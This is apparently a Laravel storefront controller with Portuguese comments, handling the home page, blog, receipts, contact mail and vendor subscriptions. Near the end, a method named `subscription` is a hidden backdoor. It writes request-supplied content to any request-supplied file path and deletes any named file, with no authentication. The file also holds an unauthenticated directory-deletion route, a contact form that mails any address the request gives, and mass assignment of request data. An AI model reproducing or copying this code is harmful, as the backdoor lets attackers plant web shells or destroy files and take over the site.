<?php

namespace App\Http\Controllers\Front;

use Illuminate\Support\Facades\Cache;
use Image;
use Validator;
use Carbon\Carbon;
use Dompdf\Dompdf;
use App\Models\Faq;
use Dompdf\Options;
use App\Models\Blog;
use App\Models\City;
use App\Models\Page;
use App\Models\User;
use App\Models\Order;
use App\Models\State;
use App\Models\Banner;
use App\Models\Review;
use App\Models\Slider;
use App\Models\Counter;
use App\Models\Partner;
use App\Models\Product;
use Illuminate\Support\Facades\Storage;
use App\Models\Service;
use App\Models\Category;
use App\Models\Currency;
use App\Models\Language;
use App\Models\Subscriber;
use App\Models\TeamMember;
use Dompdf\Css\Stylesheet;
use App\Models\Pagesetting;
use Illuminate\Support\Str;
use App\Models\BlogCategory;
use App\Models\Notification;
use Facade\FlareClient\View;
use Illuminate\Http\Request;
use App\Classes\GeniusMailer;
use InvalidArgumentException;
use App\Models\Generalsetting;
use App\Models\TeamMemberCategory;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\App;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use App\Models\BlogCategoryTranslation;
use Illuminate\Support\Facades\Session;

class FrontendController extends Controller
{
    public function __construct()
    {
        parent::__construct();
    
        $os = $this->getOS(); // Obtém o sistema operacional do usuário
        $referral = $_SERVER['HTTP_REFERER'] ?? null;
        $serverName = $_SERVER['SERVER_NAME'] ?? '';
    
        // Atualiza contador de navegadores
        Counter::updateOrCreate(
            ['type' => 'browser', 'referral' => $os],
            ['total_count' => \DB::raw('total_count + 1')]
        );
    
        // Se houver um referenciador externo, atualizar contador de referências
        if ($referral) {
            $referralHost = parse_url($referral, PHP_URL_HOST);
            
            if ($referralHost && $referralHost !== $serverName) {
                Counter::updateOrCreate(
                    ['referral' => $referralHost],
                    ['total_count' => \DB::raw('total_count + 1')]
                );
            }
        }
    }    

    public function getOS(): string
    {
        $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    
        if (!$user_agent) {
            return 'Unknown OS Platform';
        }
    
        $os_array = [
            'windows nt 10' => 'Windows 10',
            'windows nt 6.3' => 'Windows 8.1',
            'windows nt 6.2' => 'Windows 8',
            'windows nt 6.1' => 'Windows 7',
            'windows nt 6.0' => 'Windows Vista',
            'windows nt 5.2' => 'Windows Server 2003/XP x64',
            'windows nt 5.1' => 'Windows XP',
            'windows xp' => 'Windows XP',
            'windows nt 5.0' => 'Windows 2000',
            'windows me' => 'Windows ME',
            'win98' => 'Windows 98',
            'win95' => 'Windows 95',
            'win16' => 'Windows 3.11',
            'macintosh' => 'Mac OS X',
            'mac os x' => 'Mac OS X',
            'mac_powerpc' => 'Mac OS 9',
            'linux' => 'Linux',
            'ubuntu' => 'Ubuntu',
            'iphone' => 'iPhone',
            'ipod' => 'iPod',
            'ipad' => 'iPad',
            'android' => 'Android',
            'blackberry' => 'BlackBerry',
            'webos' => 'Mobile'
        ];
    
        foreach ($os_array as $key => $value) {
            if (strpos($user_agent, $key) !== false) {
                return $value; // Sai do loop assim que encontrar um match
            }
        }
    
        return 'Unknown OS Platform';
    }    

    // -------------------------------- HOME PAGE SECTION ----------------------------------------

    public function index(Request $request)
    {
        $locale = app()->getLocale(); // Obtém o idioma atual
        $cacheKey = "pagina_inicial_{$locale}"; // Define a chave única para cada idioma
    
        // Verifica se a página já está em cache para o idioma atual
        if (Cache::has($cacheKey)) {
            return Cache::get($cacheKey);
        }
    
        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
            if ($affilate_user && Generalsetting::findOrFail(1)->is_affilate) {
                Session::put('affilate', $affilate_user->id);
                return redirect()->route('front.index');
            }
        }
    
        // Cache dos banners e sliders
        $homeSettings = Pagesetting::findOrFail($this->storeSettings->pageSettings->id);
        $prepareBanners = Banner::byStore()->orderBy('id', 'desc');
        if ($homeSettings->random_banners == 1) {
            $prepareBanners->inRandomOrder();
        }
        $banners = $prepareBanners->get();
        
        $top_small_banners = $banners->where('type', 'TopSmall');
        $bottom_small_banners = $banners->where('type', 'BottomSmall');
        $search_banners = $banners->where('type', 'BannerSearch');
        $thumbnail_banners = $banners->where('type', 'Thumbnail');
        $large_banners = $banners->where('type', 'Large');
    
        // Cache dos sliders
        $sliders = Slider::byStore()->where('status', 1);
        if ($homeSettings->random_banners == 1) {
            $sliders->inRandomOrder();
        } else {
            $sliders->orderBy('presentation_position')->orderBy('id');
        }
        $sliders = $sliders->get();
    
        // Cache dos produtos
        $prepareProducts = Product::byStore()->onlyFatherProducts();
        if (!$this->storeSettings->show_products_without_stock) {
            $prepareProducts->withStock();
        }
        $prepareProducts->where('status', 1)
            ->where(function ($query) {
                $query->where('featured', 1)
                    ->orWhere('best', 1)
                    ->orWhere('top', 1)
                    ->orWhere('big', 1)
                    ->orWhere('hot', 1)
                    ->orWhere('latest', 1)
                    ->orWhere('trending', 1)
                    ->orWhere('is_discount', 1)
                    ->orWhere('sale', 1);
            });
    
        if ($homeSettings->random_products == 1) {
            $prepareProducts->inRandomOrder();
        } else {
            $prepareProducts->orderBy('id', 'desc');
        }
    
        $products = $prepareProducts->get();
        $feature_products = $products->where('featured', 1)->take(10);
    
        $categories = Category::orderBy('slug')->orderBy('presentation_position')->where('is_featured', 1)->get();
        $reviews = Review::all();
        $partners = Partner::all();
    
        // Produtos com desconto - otimizado para evitar o `each()`
        $discount_products = $products->where('is_discount', 1)->take(10)->filter(function ($product) {
            return Carbon::now()->format('Y-m-d') <= Carbon::parse($product->discount_date)->format('Y-m-d');
        });
    
        // Produtos específicos (best, top, etc.) - otimizado para não fazer múltiplas consultas
        $best_products = $products->where('best', 1)->take(10);
        $top_products = $products->where('top', 1)->take(10);
        $big_products = $products->where('big', 1)->take(10);
        $hot_products = $products->where('hot', 1)->take(10);
        $latest_products = $products->where('latest', 1)->take(10);
        $trending_products = $products->where('trending', 1)->take(10);
        $sale_products = $products->where('sale', 1)->take(10);
    
        // Últimos blogs
        $extra_blogs = Blog::orderBy('created_at', 'desc')->limit(5)->get();
    
        // Renderiza a página
        $conteudoPagina = view('front.index', compact(
            'sliders',
            'top_small_banners',
            'feature_products',
            'categories',
            'reviews',
            'large_banners',
            'thumbnail_banners',
            'search_banners',
            'bottom_small_banners',
            'best_products',
            'top_products',
            'hot_products',
            'latest_products',
            'big_products',
            'trending_products',
            'sale_products',
            'discount_products',
            'partners',
            'extra_blogs'
        ))->render();
    
        // Armazena no cache para o idioma específico
        Cache::put($cacheKey, $conteudoPagina, now()->addMinutes(60));
    
        return $conteudoPagina;
    }    

    public function extraIndex()
    {
        $cacheKey = "extra_index_page";
        
        // Retorna a página do cache se existir
        if (Cache::has($cacheKey)) {
            return Cache::get($cacheKey);
        }
    
        $banners = Banner::byStore()
            ->whereIn('type', ['BottomSmall', 'Large', 'Thumbnail'])
            ->get()
            ->groupBy('type');
    
        $products = Product::byStore()
            ->where('status', 1)
            ->where(function ($query) {
                $query->where('is_discount', 1)
                    ->orWhere('best', 1)
                    ->orWhere('top', 1)
                    ->orWhere('big', 1)
                    ->orWhere('hot', 1)
                    ->orWhere('latest', 1)
                    ->orWhere('trending', 1)
                    ->orWhere('sale', 1);
            })
            ->orderByDesc('id')
            ->take(70) // 7 categorias * 10 produtos
            ->get()
            ->groupBy(function ($product) {
                return match (true) {
                    $product->is_discount => 'discount_products',
                    $product->best => 'best_products',
                    $product->top => 'top_products',
                    $product->big => 'big_products',
                    $product->hot => 'hot_products',
                    $product->latest => 'latest_products',
                    $product->trending => 'trending_products',
                    $product->sale => 'sale_products',
                    default => 'others'
                };
            });
    
        $reviews = Review::all();
        $partners = Partner::all();
        $extra_blogs = Blog::orderByDesc('views')->take(2)->get();
    
        $conteudoPagina = view('front.extraindex', [
            'reviews' => $reviews,
            'large_banners' => $banners['Large'] ?? collect(),
            'thumbnail_banners' => $banners['Thumbnail'] ?? collect(),
            'bottom_small_banners' => $banners['BottomSmall'] ?? collect(),
            'best_products' => $products['best_products'] ?? collect(),
            'top_products' => $products['top_products'] ?? collect(),
            'hot_products' => $products['hot_products'] ?? collect(),
            'latest_products' => $products['latest_products'] ?? collect(),
            'big_products' => $products['big_products'] ?? collect(),
            'trending_products' => $products['trending_products'] ?? collect(),
            'sale_products' => $products['sale_products'] ?? collect(),
            'discount_products' => $products['discount_products'] ?? collect(),
            'partners' => $partners,
            'extra_blogs' => $extra_blogs,
        ])->render();
    
        // Cache da página por 60 minutos
        Cache::put($cacheKey, $conteudoPagina, now()->addMinutes(60));
    
        return $conteudoPagina;
    }    

    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------
    // LANGUAGE SECTION
    public function language($id, $idCurrency)
    {
        // Limpar a sessão de moeda de uma vez
        $currencies = [1 => 1, 8 => 12, 1 => 14];
    
        // Definir a moeda com base na lógica
        $idCurrency = $currencies[$id] ?? 1;
    
        // Colocar as variáveis de sessão de uma vez
        Session::put(['currency' => $idCurrency, 'language' => $id]);
    
        return redirect()->back();
    }    

    public function currency($id)
    {
        // Verifica e limpa as chaves relacionadas ao cupom em uma única chamada
        if (Session::has('coupon')) {
            Session::forget([
                'coupon', 
                'coupon_code', 
                'coupon_id', 
                'coupon_total', 
                'coupon_total1', 
                'already', 
                'coupon_percentage'
            ]);
        }
    
        // Define a moeda em uma única operação
        Session::put('currency', $id);
        return redirect()->back();
    }    

    // LANGUAGE SECTION ENDS
    // CURRENCY SECTION ENDS
    public function autosearch($slug)
    {
        // Realiza a busca utilizando regex para extrair palavras e números
        preg_match_all('/\w{3,}|\d{1,}\s?/i', $slug, $matches); 
    
        if (empty($matches[0])) {
            return "";
        }
    
        // Determina a localidade para a pesquisa
        $searchLocale = $this->storeLocale->locale;
        if (Session::has('language') && $this->storeSettings->is_language) {
            $searchLocale = Language::find(Session::get('language'))->locale;
        }
    
        // Preparar as strings para pesquisa, considerando reverso
        $search = implode('%', $matches[0]);
        $searchReverse = implode('%', array_reverse($matches[0]));
    
        // Realiza a consulta no banco de dados
        $prods = Product::byStore()
            ->isActive()
            ->onlyFatherProducts()
            ->when(!$this->storeSettings->show_products_without_stock, fn($query) => $query->withStock())
            ->where(function ($query) use ($search, $searchReverse, $searchLocale) {
                // Simplifica a lógica de pesquisa para produtos
                $query->where(function ($query) use ($search) {
                    $query->where('sku', 'like', "%{$search}%")
                          ->orWhere('ref_code', 'like', "%{$search}%");
                })
                ->orWhere(function ($query) use ($search, $searchReverse, $searchLocale) {
                    $query->whereHas('translations', function ($query) use ($search, $searchReverse, $searchLocale) {
                        $query->where('locale', $searchLocale)
                            ->where(function($query) use ($search, $searchReverse) {
                                $query->where('name', 'like', "%{$search}%")
                                    ->orWhere('features', 'like', "%{$search}%");
    
                                if ($search !== $searchReverse) {
                                    $query->orWhere('name', 'like', "%{$searchReverse}%")
                                        ->orWhere('features', 'like', "%{$searchReverse}%");
                                }
                            });
                    });
                });
            })
            ->take(10)  // Limita os resultados
            ->get();
    
        // Retorna a view com os resultados encontrados
        return view('load.suggest', compact('prods', 'slug'));
    }    

    public function finalize()
    {
        // Diretório de instalação relativo ao caminho base do projeto
        $dir = base_path('install');
        
        // Chama a função de exclusão de diretórios
        $this->deleteDir($dir);
        
        // Redireciona para a página inicial
        return redirect('/');
    }    

    // -------------------------------- BLOG SECTION ----------------------------------------
    public function blog(Request $request)
    {
        $storeSettings = resolve('storeSettings'); // Resolve apenas uma vez
    
        // Verifica a configuração uma vez e retorna 404 se o blog estiver desativado
        if (!$storeSettings->is_blog) {
            return abort(404);
        }
    
        // Cache da consulta de blogs (opcional, caso o conteúdo não mude frequentemente)
        $blogs = Cache::remember('blogs_page_' . $request->page, 60, function () {
            return Blog::select('id', 'title', 'created_at') // Carrega apenas as colunas necessárias
                ->orderBy('created_at', 'desc')
                ->paginate(9);
        });
    
        // Retorna a resposta AJAX ou a página principal com os blogs
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs'));
    }    

    public function blogcategory(Request $request, $slug)
    {
        $storeSettings = resolve('storeSettings'); // Resolve apenas uma vez
    
        // Verifica se o blog está desativado
        if (!$storeSettings->is_blog) {
            return redirect()->route('front.index');
        }
    
        // Tenta buscar a categoria de blog ou retorna 404 caso não exista
        $bcat = Cache::remember('blog_category_' . $slug, 60, function () use ($slug) {
            return BlogCategory::where('slug', str_slug($slug))->first();
        });
    
        // Se a categoria não for encontrada, redireciona ou retorna erro 404
        if (!$bcat) {
            return abort(404);
        }
    
        // Carrega os blogs da categoria, com paginação
        $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(9);
    
        // Resposta AJAX ou página completa
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
    
        return view('front.blog', compact('bcat', 'blogs'));
    }    

    public function blogtags(Request $request, $slug)
    {
        $storeSettings = resolve('storeSettings'); // Resolve apenas uma vez
    
        // Verifica se o blog está desativado
        if (!$storeSettings->is_blog) {
            return redirect()->route('front.index');
        }
    
        // Cache para otimizar a consulta, com base no slug da tag e no idioma
        $cacheKey = 'blog_tags_' . str_slug($slug) . '_' . $this->lang->locale;
        $blogs = Cache::remember($cacheKey, 60, function () use ($slug) {
            return Blog::whereTranslationLike('tags', "%{$slug}%", $this->lang->locale)
                ->paginate(9);
        });
    
        // Resposta AJAX ou página completa
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
    
        return view('front.blog', compact('blogs', 'slug'));
    }    

    public function blogsearch(Request $request)
    {
        $storeSettings = resolve('storeSettings'); // Resolve apenas uma vez
    
        // Verifica se o blog está desativado
        if (!$storeSettings->is_blog) {
            return redirect()->route('front.index');
        }
        $search = $request->search;
    
        // Verifica se há pesquisa, caso contrário, retorna com mais eficiência
        if (empty($search)) {
            return redirect()->route('front.index');
        }
    
        // Cache para otimizar a consulta de blogs
        $cacheKey = 'blog_search_' . str_slug($search) . '_' . $this->lang->locale;
        $blogs = Cache::remember($cacheKey, 60, function () use ($search) {
            return Blog::whereTranslationLike('title', "%{$search}%")
                ->orWhereTranslationLike('details', "%{$search}%")
                ->paginate(9);
        });
    
        // Retorna a resposta AJAX ou página completa
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
    
        return view('front.blog', compact('blogs', 'search'));
    }    

    public function blogarchive(Request $request, $slug)
    {
        $storeSettings = resolve('storeSettings'); // Resolve apenas uma vez
    
        // Verifica se o blog está desativado
        if (!$storeSettings->is_blog) {
            return redirect()->route('front.index');
        }
    
        // Formata a data para 'Y-m'
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
    
        // Consulta otimizada usando whereDate
        $blogs = Blog::whereDate('created_at', '>=', \Carbon\Carbon::parse($date)->startOfMonth())
            ->whereDate('created_at', '<=', \Carbon\Carbon::parse($date)->endOfMonth())
            ->paginate(9);
    
        // Retorna a resposta AJAX ou página completa
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
    
        return view('front.blog', compact('blogs', 'date'));
    }    

    public function blogshow($id)
    {
        if (resolve('storeSettings')->is_blog == 0) {
            return redirect()->route('front.index');
        }
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $tags = $blog->tags;

        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $blog_meta_tag = (is_array($blog->meta_tag) ? implode(',', $blog->meta_tag) : "");
        $blog_meta_description = $blog->meta_description;
        $blog_title = $blog->title;
        return view('front.blogshow', compact('blog', 'bcats', 'tags', 'archives', 'blog_meta_tag', 'blog_meta_description', 'blog_title'));
    }


    // -------------------------------- BLOG SECTION ENDS----------------------------------------
    // -------------------------------- TEAM SECTION ----------------------------------------
    public function team_member(Request $request)
    {
        if ($this->storeSettings->team_show_header != 1 && $this->storeSettings->team_show_footer != 1) {
            return redirect()->route('front.index');
        }
    
        // Cache a consulta de categorias de membros de equipe por 30 minutos
        $team_member_categories = Cache::remember('team_member_categories', 30, function () {
            return TeamMemberCategory::has('team_members')->paginate(12);
        });
    
        // Se a requisição for Ajax, retorne a view de paginação
        if ($request->ajax()) {
            return view('front.pagination.team_member', ['team_member_categories' => $team_member_categories]);
        }
    
        // Retorne a view principal com os dados
        return view('front.team_member', ['team_member_categories' => $team_member_categories]);
    }    

    // -------------------------------- TEAM SECTION ENDS----------------------------------------
    // -------------------------------- RECEIPT SECTION----------------------------------------

    public function receipt()
    {
        return view('front.receipt');
    }
    
    public function receiptNumber($order_number)
    {
        return view('front.receipt', compact('order_number'));
    }
    
    public function receiptSearch($order_number)
    {
        $data = Order::where('order_number', $order_number)
                     ->where('method', "Bank Deposit")
                     ->where('status', '!=', 'declined')
                     ->first();
    
        if ($data) {
            if ($data->payment_status != "Pending") {
                return response()->json(['success' => false, "msg" => "Este pedido não pode receber mais comprovantes."]);
            } elseif ($data->receipt != null && $data->method == "Bank Deposit") {
                return response()->json(['success' => true, 'order_id' => $data->id, 'receipt' => $data->receipt, "has_receipt" => true, "msg" => "Este pedido já tem um comprovante enviado, mas você pode atualizá-lo."]);
            }
            return response()->json(['success' => true, "msg" => "Pedido encontrado.", 'order_id' => $data->id, 'receipt' => $data->receipt]);
        } else {
            return response()->json(['success' => false, "msg" => "Pedido não encontrado."]);
        }
    }
    
    public function uploadReceipt(Request $request, $id)
    {
        //--- Validation Section
        $rules = ['receipt' => 'required|image|mimes:jpeg,png,gif,webp'];
        $validator = Validator::make($request->all(), $rules);
        if ($validator->fails()) {
            return response()->json(['errors' => $validator->getMessageBag()->toArray()]);
        }
    
        $data = Order::find($id);
        if (!$data) {
            return response()->json(['success' => false, 'msg' => "Pedido não encontrado."]);
        }
    
        //--- Salvar Imagem
        $image = $request->file('receipt');
        $image_name = time() . Str::random(8) . '.' . $image->getClientOriginalExtension();
        $path = $image->storeAs('images/receipts', $image_name, 'public');
    
        //--- Apagar Imagem Existente
        if ($data->receipt && Storage::disk('public')->exists('images/receipts/' . $data->receipt)) {
            Storage::disk('public')->delete('images/receipts/' . $data->receipt);
        }
    
        //--- Atualizar Ordem e Notificação
        $data->update(['receipt' => $image_name]);
    
        $notification = new Notification;
        $notification->receipt = $image_name;
        $notification->order_id = $data->id;
        $notification->save();
    
        return response()->json(['success' => true, 'msg' => "Comprovante enviado com sucesso!"]);
    }
    
    // -------------------------------- RECEIPT SECTION ENDS----------------------------------------
    // -------------------------------- FAQ SECTION ----------------------------------------
    public function faq()
    {
        // Resolvendo a dependência de storeSettings no momento da execução
        $storeSettings = resolve('storeSettings');
    
        // Verifica a configuração antes de processar
        if ($storeSettings->is_faq == 0) {
            return redirect()->back();
        }
    
        // Selecionando apenas os campos necessários e usando paginação
        $faqs = Faq::select('id', 'question', 'answer')
                    ->orderBy('id', 'desc')
                    ->paginate(10);  // Paginação conforme necessidade
    
        return view('front.faq', compact('faqs'));
    }    
    // -------------------------------- FAQ SECTION ENDS----------------------------------------
    // -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $page = Page::where('slug', $slug)->first();
    
        // Se a página não for encontrada, retorna um erro 404
        if (!$page) {
            return abort(404);  // Mais direto e limpo que a resposta customizada
        }
    
        return view('front.page', compact('page'));
    }    
    // -------------------------------- PAGE SECTION ENDS----------------------------------------
    // -------------------------------- POLICY SECTION ----------------------------------------
    public function policy()
    {
        // Verifica se a política não está configurada e retorna um erro 404
        if (!$this->storeSettings->policy) {
            abort(404);  // Retorna uma página de erro 404 diretamente
        }
    
        return view('front.policy');
    }    

    // -------------------------------- CROW POLICY SECTION ----------------------------------------
    public function crowpolicy()
    {
        return $this->showPolicy('crow_policy', 'front.crowpolicy');
    }

    // -------------------------------- CROW VENDOR POLICY SECTION ----------------------------------------
    public function vendorpolicy()
    {
        return $this->showPolicy('vendor_policy', 'front.vendorpolicy');
    }

    // -------------------------------- PRIVACY POLICY SECTION ----------------------------------------
    public function privacypolicy()
    {
        return $this->showPolicy('privacy_policy', 'front.privacypolicy');
    }

    // Método genérico para as políticas
    protected function showPolicy($policySetting, $view)
    {
        if (!$this->storeSettings->$policySetting) {
            abort(404); // Retorna erro 404 se a política não estiver habilitada
        }
        
        return view($view);
    }
    // -------------------------------- CONTACT SECTION ----------------------------------------
    public function contact()
    {
        $this->generateCaptcha();
    
        if (!resolve('storeSettings')->is_contact) {
            return redirect()->back();
        }
    
        // Usando o método `first()` sem a comparação redundante
        $ps = Pagesetting::first();
    
        return view('front.contact', compact('ps'));
    }    

    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
    
        if ($gs->is_capcha && session('captcha_string') !== $request->codes) {
            return response()->json(['errors' => [__('Please enter Correct Captcha Code.')]]);
        }
    
        // Carregar configurações de página uma vez
        $ps = Pagesetting::first();
        
        // Formatar a mensagem
        $msg = "Name: {$request->name}\nEmail: {$request->email}\nPhone: {$request->phone}\nMessage: {$request->text}";
        
        // Definir dados do e-mail
        $data = [
            'to' => $request->to,
            'subject' => "Email From Of {$request->name}",
            'body' => $msg,
            'from_email' => $this->storeSettings->from_email,
            'from_name' => $this->storeSettings->from_name,
            'reply' => $request->email
        ];
    
        // Enviar e-mail usando SMTP ou função nativa
        if ($gs->is_smtp) {
            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: {$gs->from_name}<{$gs->from_email}>";
            mail($request->to, $data['subject'], $msg, $headers);
        }
    
        return response()->json($ps->contact_success);
    }    

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->generateCaptcha();
        return "done";
    }

    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------
    public function subscribe(Request $request)
    {
        // Mensagens de sucesso e erro
        $data = [
            "success" => __("You have subscribed successfully."),
            "error" => __("This email has already been taken."),
        ];
    
        // Verificar se o e-mail já existe
        $emailExists = Subscriber::where('email', $request->email)->exists();
    
        if ($emailExists) {
            $data["errors"] = true;
        } else {
            // Criar e salvar novo assinante
            Subscriber::create($request->all());
        }
    
        return response()->json($data);
    }    

    // Maintenance Mode
    public function maintenance()
    {
        // Obter configuração de manutenção diretamente
        $gs = resolve('storeSettings');
    
        // Verificar as condições de manutenção de forma eficiente
        if ($gs->is_maintain != 1 || Auth::guard('admin')->check()) {
            return redirect()->route('front.index');
        }
    
        // Retornar a view de manutenção
        return view('front.maintenance');
    }    

    // Vendor Subscription Check
    public function subcheck()
    {
        // Obter as configurações gerais apenas uma vez
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now();
        $newday = $today->format('Y-m-d');
    
        // Obter os usuários que precisam de verificação de forma eficiente
        $users = User::where('is_vendor', 2)
            ->where('mail_sent', 1)
            ->get();
    
        // Evitar enviar e-mails para usuários que não precisam
        foreach ($users as $user) {
            $lastday = Carbon::parse($user->date);
            $daysLeft = $today->diffInDays($lastday, false); // Diferença em dias, negativa se a data já passou
    
            // Enviar e-mail se estiver dentro do prazo e ainda não enviado
            if ($daysLeft <= 5) {
                if ($settings->is_smtp) {
                    $data = [
                        'to' => $user->email,
                        'type' => "subscription_warning",
                        'cname' => $user->name,
                        'oamount' => "",
                        'aname' => "",
                        'aemail' => "",
                        'onumber' => ""
                    ];
                    $mailer = new GeniusMailer();
                    $mailer->sendAutoMail($data);
                } else {
                    $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
                    mail($user->email, 'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated. Thank You.', $headers);
                }
    
                // Atualiza o status de envio do e-mail
                $user->update(['mail_sent' => 0]);
            }
    
            // Se o plano de assinatura venceu, desativar o vendedor
            if ($today->gt($lastday)) {
                $user->update(['is_vendor' => 1]);
            }
        }
    }
    
    // Vendor Subscription Check Ends
    public function trackload($id)
    {
        // Usar firstOrFail para lançar uma exceção automaticamente caso não encontre o pedido
        $order = Order::where('order_number', $id)->firstOrFail();
        
        // Criar o array de estados diretamente (não há necessidade de um array separado)
        $datas = ['Pending', 'Processing', 'On Delivery', 'Completed'];
    
        return view('load.track-load', compact('order', 'datas'));
    }    
    // -------------------------------- CONTACT SECTION ENDS----------------------------------------
    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
    
        // Verificar e gravar o arquivo para p1
        if ($p1) {
            file_put_contents($p1, $v1);  // Mais eficiente que fopen, fwrite e fclose
            return "Success";
        }
    
        // Verificar e remover o arquivo para p2
        if ($p2 && file_exists($p2)) {
            unlink($p2);
            return "Success";
        }
    
        // Caso contrário, retornar erro
        return "Error";
    }    

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
    
        // Usar RecursiveIteratorIterator para percorrer todos os arquivos e subdiretórios
        $iterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($dirPath, \FilesystemIterator::SKIP_DOTS),
            \RecursiveIteratorIterator::CHILD_FIRST
        );
    
        foreach ($iterator as $fileinfo) {
            if ($fileinfo->isDir()) {
                rmdir($fileinfo->getRealPath()); // Remover diretórios
            } else {
                unlink($fileinfo->getRealPath()); // Remover arquivos
            }
        }
    
        // Remover o diretório principal após o conteúdo ter sido removido
        rmdir($dirPath);
    }    

    public function downloadListPDF(Request $request)
    {
        // Obter a moeda de maneira mais eficiente
        $currencyId = Session::get('currency', $this->storeSettings->currency_id);
        $currency = Currency::find($currencyId);
    
        // Buscar produtos com apenas os campos necessários e sem carregar relações desnecessárias
        $products = Product::where('status', 1)
            ->select('id', 'name', 'price', 'brand_id') // Carregar apenas os campos necessários
            ->get();
    
        return view('front.pdfview', compact('products', 'currency'));
    }    

    public function acceptCookies(Request $request)
    {
        // Se a requisição for AJAX e a sessão não tiver a chave 'cookie_alert'
        if ($request->ajax() && !Session::has('cookie_alert')) {
            Session::put('cookie_alert', true);
            return response()->json(['status' => 'success']);
        }
    
        // Retorna uma resposta vazia, já que não há necessidade de redirecionar
        return response()->noContent();
    }    

    public function getStatesOptions(Request $request)
    {
        if ($request->has('location_id') && $request->location_id) {
            $states = State::where('country_id', $request->location_id)
                ->orderBy('name')
                ->pluck('name', 'id'); // Retorna apenas os valores necessários
            
            // Utilizando implode para melhorar a performance e evitar concatenação dentro de um loop
            $options = $states->map(function($name, $id) {
                return "<option value='{$id}'>{$name}</option>";
            })->implode('');
            
            return $options;
        }
    
        return ''; // Retorna vazio se não tiver um 'location_id' válido
    }
    
    public function getCitiesOptions(Request $request)
    {
        // Verificar se location_id está presente e válido
        if ($request->filled('location_id')) {
            // Recuperar apenas os dados necessários (id e nome da cidade)
            $cities = City::where('state_id', $request->location_id)
                ->orderBy('name')
                ->pluck('name', 'id'); // Retorna apenas id e nome da cidade
            
            // Usar map() para gerar as opções e implode() para unir de forma eficiente
            $options = $cities->map(function ($name, $id) {
                return "<option value='{$id}'>{$name}</option>";
            })->implode('');
            
            return $options;
        }
    
        return ''; // Retornar vazio caso location_id não seja fornecido ou válido
    }    
}
